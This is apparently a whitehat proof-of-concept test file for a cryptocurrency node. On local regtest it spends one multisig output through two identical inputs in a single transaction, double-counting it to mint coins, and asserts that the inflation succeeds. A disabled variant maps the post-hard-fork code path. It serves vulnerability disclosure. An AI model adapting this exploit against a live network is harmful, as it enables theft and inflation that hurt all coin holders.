// Whitehat PoC test (local regtest only). See header for the bug description.
// This file is under tests/ only. No src/ code is modified.

#include "chaingen.h"
#include "multisig_same_tx_double_count.h"

using namespace epee;
using namespace crypto;
using namespace currency;

gen_multisig_same_tx_double_count::gen_multisig_same_tx_double_count()
{
  REGISTER_CALLBACK_METHOD(gen_multisig_same_tx_double_count, check_inflation);
}

bool gen_multisig_same_tx_double_count::generate(std::vector<test_event_entry>& events) const
{
  // === Accounts ===
  // The attacker controls BOTH multisig owners (alice + bob). The recipient of the
  // inflated funds is bob (an account we control). miner mines the chain.
  GENERATE_ACCOUNT(preminer_acc);

  m_accounts.resize(TOTAL_ACCS_COUNT);
  account_base& miner_acc = m_accounts[MINER_ACC_IDX]; miner_acc.generate();
  account_base& alice_acc = m_accounts[ALICE_ACC_IDX]; alice_acc.generate();
  account_base& bob_acc   = m_accounts[BOB_ACC_IDX];   bob_acc.generate();

  MAKE_GENESIS_BLOCK(events, blk_0, preminer_acc, test_core_time::get_time());

  // === 1. Mine to maturity ===
  // Each test block reward is 1 COIN; the last (WINDOW-1) blocks stay locked. Mine
  // 3*WINDOW blocks so the miner has well over A unlocked coins to fund the ms output.
  REWIND_BLOCKS_N_WITH_TIME(events, blk_0r, blk_0, miner_acc, 3 * CURRENCY_MINED_MONEY_UNLOCK_WINDOW);

  bool r = false;
  const uint64_t A = 5 * COIN; // value of the single multisig output the attacker controls

  // === 2. Create a 2-of-2 multisig output of amount A owned by alice + bob ===
  std::list<account_public_address> ms_addr_list({ alice_acc.get_public_address(), bob_acc.get_public_address() });
  std::vector<tx_source_entry> sources;
  std::vector<tx_destination_entry> destinations;
  r = fill_tx_sources_and_destinations(events, blk_0r, miner_acc.get_keys(), ms_addr_list,
                                       A, TESTS_DEFAULT_FEE, 0, sources, destinations,
                                       true, true, /*minimum_sigs=*/2);
  CHECK_AND_ASSERT_MES(r, false, "fill_tx_sources_and_destinations failed");

  transaction ms_tx = AUTO_VAL_INIT(ms_tx);
  r = construct_tx(miner_acc.get_keys(), sources, destinations, empty_attachment, ms_tx,
                   get_tx_version_from_events(events), 0, 0);
  CHECK_AND_ASSERT_MES(r, false, "construct_tx (multisig creation) failed");
  events.push_back(ms_tx);

  size_t ms_out_idx = get_tx_out_index_by_amount(ms_tx, A);
  crypto::hash ms_id = get_multisig_out_id(ms_tx, ms_out_idx);
  CHECK_AND_ASSERT_MES(ms_id != null_hash, false, "failed to compute multisig_out_id");

  // Put the multisig-creating tx into a block. Now exactly ONE multisig output worth A exists.
  MAKE_NEXT_BLOCK_TX1(events, blk_1, blk_0r, miner_acc, ms_tx);

  // === 3. Build ONE spend tx with TWO IDENTICAL txin_multisig inputs ===
  // Both inputs reference the SAME ms_id. Destination = 2A - fee, all to bob (us).
  tx_source_entry se = AUTO_VAL_INIT(se);
  se.amount = A;
  se.multisig_id = ms_id;
  se.real_output_in_tx_index = ms_out_idx;
  se.real_out_tx_key = get_tx_pub_key_from_extra(ms_tx);
  se.ms_keys_count = boost::get<txout_multisig>(boost::get<currency::tx_out_bare>(ms_tx.vout[se.real_output_in_tx_index]).target).keys.size();
  se.ms_sigs_count = 2;

  // Preferred path: pass TWO identical sources to construct_tx. Each becomes its own
  // txin_multisig input referencing the same ms_id. The input side sums to 2A, so we
  // can create a single output worth 2A - fee. Only ONE A-valued output is actually
  // consumed -> A is minted from nothing.
  std::vector<tx_source_entry> evil_sources({ se, se });
  std::vector<tx_destination_entry> evil_dsts({ tx_destination_entry(2 * A - TESTS_DEFAULT_FEE, bob_acc.get_public_address()) });

  transaction evil_tx = AUTO_VAL_INIT(evil_tx);
  r = construct_tx(miner_acc.get_keys(), evil_sources, evil_dsts, empty_attachment, evil_tx,
                   get_tx_version_from_events(events), 0, 0);
  CHECK_AND_ASSERT_MES(r, false, "construct_tx (malicious double-count spend) failed");

  CHECK_AND_ASSERT_MES(evil_tx.vin.size() == 2, false, "expected 2 inputs in the malicious tx, got " << evil_tx.vin.size());
  CHECK_AND_ASSERT_MES(evil_tx.vin[0].type() == typeid(txin_multisig) && evil_tx.vin[1].type() == typeid(txin_multisig),
    false, "expected both inputs to be txin_multisig");
  // confirm both inputs reference the SAME multisig output id
  CHECK_AND_ASSERT_MES(
    boost::get<txin_multisig>(evil_tx.vin[0]).multisig_out_id == boost::get<txin_multisig>(evil_tx.vin[1]).multisig_out_id,
    false, "the two inputs do not reference the same multisig_out_id");

  // Sign BOTH inputs (index 0 and 1) with BOTH owner keys (alice + bob).
  bool fully0 = false, fully1 = false;
  r = sign_multisig_input_in_tx(evil_tx, 0, alice_acc.get_keys(), ms_tx, &fully0);
  CHECK_AND_ASSERT_MES(r, false, "sign_multisig_input_in_tx[0] (alice) failed");
  r = sign_multisig_input_in_tx(evil_tx, 0, bob_acc.get_keys(),   ms_tx, &fully0);
  CHECK_AND_ASSERT_MES(r && fully0, false, "sign_multisig_input_in_tx[0] (bob) failed, fully0=" << fully0);

  r = sign_multisig_input_in_tx(evil_tx, 1, alice_acc.get_keys(), ms_tx, &fully1);
  CHECK_AND_ASSERT_MES(r, false, "sign_multisig_input_in_tx[1] (alice) failed");
  r = sign_multisig_input_in_tx(evil_tx, 1, bob_acc.get_keys(),   ms_tx, &fully1);
  CHECK_AND_ASSERT_MES(r && fully1, false, "sign_multisig_input_in_tx[1] (bob) failed, fully1=" << fully1);

  events.push_back(evil_tx);

  // === 4. Submit the malicious tx in a block and ASSERT IT IS ACCEPTED ===
  // No mark_invalid_tx here: if the consensus engine rejected the tx, MAKE_NEXT_BLOCK_TX1
  // would fail to build/accept a valid block and the test fails at generation time.
  MAKE_NEXT_BLOCK_TX1(events, blk_2, blk_1, miner_acc, evil_tx);

  // mine one more block so bob's received output matures / is well past tip for refresh
  REWIND_BLOCKS_N_WITH_TIME(events, blk_2r, blk_2, miner_acc, CURRENCY_MINED_MONEY_UNLOCK_WINDOW);

  // === 5. HARM ASSERTION (inflation) ===
  // Bob must end up with ~2A - fee, i.e. ~A more than the single multisig output (A) was worth.
  DO_CALLBACK(events, "check_inflation");

  return true;
}

bool gen_multisig_same_tx_double_count::check_inflation(currency::core& c, size_t ev_index, const std::vector<test_event_entry>& events)
{
  const uint64_t A = 5 * COIN;
  const uint64_t expected_inflated_balance = 2 * A - TESTS_DEFAULT_FEE; // ~2A: A genuine + A minted from nothing

  std::shared_ptr<tools::wallet2> bob_wlt = init_playtime_test_wallet(events, c, BOB_ACC_IDX);
  bob_wlt->refresh();
  bool has_aliases = false;
  bob_wlt->scan_tx_pool(has_aliases);

  uint64_t bob_total = bob_wlt->balance();
  LOG_PRINT_L0("[INFLATION-POC] single multisig output value A = " << print_money(A));
  LOG_PRINT_L0("[INFLATION-POC] bob balance after same-tx double-count spend = " << print_money(bob_total));
  LOG_PRINT_L0("[INFLATION-POC] expected (2A - fee) if bug present = " << print_money(expected_inflated_balance));

  // The harm: bob received 2A - fee while only ONE A-valued multisig output was consumed.
  // That is A (minus fee) created from nothing.
  CHECK_AND_ASSERT_MES(bob_total >= 2 * A - TESTS_DEFAULT_FEE, false,
    "[INFLATION-POC] no inflation: bob balance " << print_money(bob_total)
    << " is below 2A - fee " << print_money(expected_inflated_balance)
    << " (single multisig output was worth A=" << print_money(A) << ")");

  CHECK_AND_ASSERT_MES(bob_total > A, false,
    "[INFLATION-POC] no inflation: bob balance " << print_money(bob_total)
    << " is not greater than the single multisig output value A=" << print_money(A));

  LOG_PRINT_L0("[INFLATION-POC] CONFIRMED: bob received " << print_money(bob_total)
    << " from a single multisig output worth " << print_money(A)
    << " -> ~" << print_money(bob_total - A) << " minted from nothing.");
  return true;
}

#if 0
//================================================================================================
// POST-HF4 reachability variant (disabled): the consensus path accepts duplicate txin_multisig
// post-HF4 (check_inputs_types_supported allows txin_multisig with no HF gate; is_allowed_after_hardfork4
// permits it; check_tx_balance:654-655 double-counts; check_tx_inputs_keyimages_diff skips it). However
// the STOCK wallet builder generate_tx_balance_proof (currency_format_utils.cpp:292) HARD-REFUSES
// txin_multisig post-HF4 ("unexpected txin_multisig input"), so this end-to-end PoC cannot be built via
// construct_tx — a custom tx-crafter would be required. Kept here disabled for documentation only.
//================================================================================================
gen_multisig_double_count_post_hf4::gen_multisig_double_count_post_hf4()
{
  REGISTER_CALLBACK_METHOD(gen_multisig_double_count_post_hf4, check_inflation);
  // Activate HF1..3 from the start, HF4 at height 40, so we can create a pre-HF4 multisig output
  // (below 40) and then spend it in a post-HF4 tx (above 40).
  m_hardforks.set_hardfork_height(1, 1);
  m_hardforks.set_hardfork_height(2, 1);
  m_hardforks.set_hardfork_height(3, 1);
  m_hardforks.set_hardfork_height(4, 40);
}

bool gen_multisig_double_count_post_hf4::generate(std::vector<test_event_entry>& events) const
{
  GENERATE_ACCOUNT(preminer_acc);
  m_accounts.resize(TOTAL_ACCS_COUNT);
  account_base& miner_acc = m_accounts[MINER_ACC_IDX]; miner_acc.generate();
  account_base& alice_acc = m_accounts[ALICE_ACC_IDX]; alice_acc.generate();
  account_base& bob_acc   = m_accounts[BOB_ACC_IDX];   bob_acc.generate();

  MAKE_GENESIS_BLOCK(events, blk_0, preminer_acc, test_core_time::get_time());
  DO_CALLBACK(events, "configure_core");

  bool r = false;
  const uint64_t A = 5 * COIN;

  // === Mine to maturity, staying BELOW HF4 (height 40) ===
  REWIND_BLOCKS_N_WITH_TIME(events, blk_0r, blk_0, miner_acc, 2 * CURRENCY_MINED_MONEY_UNLOCK_WINDOW); // ~20 blocks

  // === Create a 2-of-2 multisig output of amount A, PRE-HF4 (txout_multisig is a tx_out_bare target) ===
  std::list<account_public_address> ms_addr_list({ alice_acc.get_public_address(), bob_acc.get_public_address() });
  std::vector<tx_source_entry> sources;
  std::vector<tx_destination_entry> destinations;
  r = fill_tx_sources_and_destinations(events, blk_0r, miner_acc.get_keys(), ms_addr_list,
                                       A, TESTS_DEFAULT_FEE, 0, sources, destinations,
                                       true, true, /*minimum_sigs=*/2);
  CHECK_AND_ASSERT_MES(r, false, "fill_tx_sources_and_destinations failed");
  transaction ms_tx = AUTO_VAL_INIT(ms_tx);
  r = construct_tx(miner_acc.get_keys(), sources, destinations, empty_attachment, ms_tx,
                   get_tx_version_from_events(events), 0, 0);
  CHECK_AND_ASSERT_MES(r, false, "construct_tx (multisig creation, pre-HF4) failed");
  CHECK_AND_ASSERT_MES(ms_tx.version <= TRANSACTION_VERSION_PRE_HF4, false,
    "expected ms creation tx to be PRE-HF4, got version " << ms_tx.version);
  events.push_back(ms_tx);
  size_t ms_out_idx = get_tx_out_index_by_amount(ms_tx, A);
  crypto::hash ms_id = get_multisig_out_id(ms_tx, ms_out_idx);
  CHECK_AND_ASSERT_MES(ms_id != null_hash, false, "failed to compute multisig_out_id");
  MAKE_NEXT_BLOCK_TX1(events, blk_1, blk_0r, miner_acc, ms_tx);   // pre-HF4 block

  // === CROSS the HF4 activation height (40): keep mining until well past it ===
  REWIND_BLOCKS_N_WITH_TIME(events, blk_hf, blk_1, miner_acc, 30); // now height ~52 > 40 => POST-HF4

  // === Build ONE POST-HF4 spend tx with TWO IDENTICAL txin_multisig inputs referencing the same ms_id ===
  tx_source_entry se = AUTO_VAL_INIT(se);
  se.amount = A;
  se.multisig_id = ms_id;
  se.real_output_in_tx_index = ms_out_idx;
  se.real_out_tx_key = get_tx_pub_key_from_extra(ms_tx);
  se.ms_keys_count = boost::get<txout_multisig>(boost::get<currency::tx_out_bare>(ms_tx.vout[se.real_output_in_tx_index]).target).keys.size();
  se.ms_sigs_count = 2;

  std::vector<tx_source_entry> evil_sources({ se, se });
  std::vector<tx_destination_entry> evil_dsts({ tx_destination_entry(2 * A - TESTS_DEFAULT_FEE, bob_acc.get_public_address()) });

  transaction evil_tx = AUTO_VAL_INIT(evil_tx);
  r = construct_tx(miner_acc.get_keys(), evil_sources, evil_dsts, empty_attachment, evil_tx,
                   get_tx_version_from_events(events), 0, 0);
  CHECK_AND_ASSERT_MES(r, false, "construct_tx (post-HF4 double-count spend) failed");
  CHECK_AND_ASSERT_MES(evil_tx.version > TRANSACTION_VERSION_PRE_HF4, false,
    "expected POST-HF4 spend tx, got version " << evil_tx.version);
  CHECK_AND_ASSERT_MES(evil_tx.vin.size() == 2 &&
    evil_tx.vin[0].type() == typeid(txin_multisig) && evil_tx.vin[1].type() == typeid(txin_multisig),
    false, "expected two txin_multisig inputs");
  CHECK_AND_ASSERT_MES(
    boost::get<txin_multisig>(evil_tx.vin[0]).multisig_out_id == boost::get<txin_multisig>(evil_tx.vin[1]).multisig_out_id,
    false, "the two inputs do not reference the same multisig_out_id");

  bool fully0 = false, fully1 = false;
  r = sign_multisig_input_in_tx(evil_tx, 0, alice_acc.get_keys(), ms_tx, &fully0);
  CHECK_AND_ASSERT_MES(r, false, "sign[0] alice failed");
  r = sign_multisig_input_in_tx(evil_tx, 0, bob_acc.get_keys(),   ms_tx, &fully0);
  CHECK_AND_ASSERT_MES(r && fully0, false, "sign[0] bob failed");
  r = sign_multisig_input_in_tx(evil_tx, 1, alice_acc.get_keys(), ms_tx, &fully1);
  CHECK_AND_ASSERT_MES(r, false, "sign[1] alice failed");
  r = sign_multisig_input_in_tx(evil_tx, 1, bob_acc.get_keys(),   ms_tx, &fully1);
  CHECK_AND_ASSERT_MES(r && fully1, false, "sign[1] bob failed");
  events.push_back(evil_tx);

  // === Submit in a POST-HF4 block and ASSERT IT IS ACCEPTED (no mark_invalid_tx) ===
  MAKE_NEXT_BLOCK_TX1(events, blk_2, blk_hf, miner_acc, evil_tx);
  REWIND_BLOCKS_N_WITH_TIME(events, blk_2r, blk_2, miner_acc, CURRENCY_MINED_MONEY_UNLOCK_WINDOW);

  DO_CALLBACK(events, "check_inflation");
  return true;
}

bool gen_multisig_double_count_post_hf4::check_inflation(currency::core& c, size_t ev_index, const std::vector<test_event_entry>& events)
{
  const uint64_t A = 5 * COIN;
  std::shared_ptr<tools::wallet2> bob_wlt = init_playtime_test_wallet(events, c, BOB_ACC_IDX);
  bob_wlt->refresh();
  bool has_aliases = false;
  bob_wlt->scan_tx_pool(has_aliases);
  uint64_t bob_total = bob_wlt->balance();

  LOG_PRINT_L0("[INFLATION-POC-HF4] single PRE-HF4 multisig output value A = " << print_money(A));
  LOG_PRINT_L0("[INFLATION-POC-HF4] bob balance after POST-HF4 same-tx double-count spend = " << print_money(bob_total));
  LOG_PRINT_L0("[INFLATION-POC-HF4] expected (2A - fee) if bug present = " << print_money(2 * A - TESTS_DEFAULT_FEE));

  CHECK_AND_ASSERT_MES(bob_total >= 2 * A - TESTS_DEFAULT_FEE, false,
    "[INFLATION-POC-HF4] no inflation: bob balance " << print_money(bob_total)
    << " below 2A - fee " << print_money(2 * A - TESTS_DEFAULT_FEE));
  CHECK_AND_ASSERT_MES(bob_total > A, false,
    "[INFLATION-POC-HF4] no inflation: bob balance " << print_money(bob_total) << " not greater than A=" << print_money(A));

  LOG_PRINT_L0("[INFLATION-POC-HF4] CONFIRMED (POST-HF4): bob received " << print_money(bob_total)
    << " from a single pre-HF4 multisig output worth " << print_money(A)
    << " -> ~" << print_money(bob_total - A) << " minted from nothing on a post-HF4 tx.");
  return true;
}
#endif // disabled post-HF4 variant (requires custom tx-crafter; see comment above)
